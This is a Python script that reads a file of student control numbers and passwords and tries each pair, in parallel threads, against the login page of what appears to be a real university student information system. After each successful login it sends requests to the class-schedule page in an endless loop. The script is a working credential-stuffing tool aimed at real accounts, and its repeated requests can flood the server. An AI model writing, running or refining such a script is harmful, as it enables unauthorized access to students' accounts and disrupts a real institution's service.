import requests
from bs4 import BeautifulSoup
import threading

# Define the URL of the login page
login_url = "https://sii.itq.edu.mx/sistema/index.php"

# Function to perform login and retrieve student name
def login_and_get_name(control_number, nip):
    session = requests.Session()

    # Prepare the data for the POST request
    data = {
        "no_de_control": control_number,
        "password": nip,
    }

    # Send a POST request to the login page
    response = session.post(login_url, data=data)
    if "modulos/alu/" in response.text:
      while True:
        response2 = session.post("https://sii.itq.edu.mx/sistema/modulos/cons/alumnos/horario.php")
        print(f"{control_number} is logged in.")
    else:
        print(f"Login failed for control number {control_number}.")

# Read usernames and passwords from the file
with open("supremepower.txt", "r") as file:
    lines = file.readlines()

# Create threads for each login attempt
threads = []
for line in lines:
    control_number, nip = line.strip().split(':')
    thread = threading.Thread(target=login_and_get_name, args=(control_number, nip))
    threads.append(thread)

# Start all threads
for thread in threads:
    thread.start()

# Wait for all threads to finish
for thread in threads:
    thread.join()
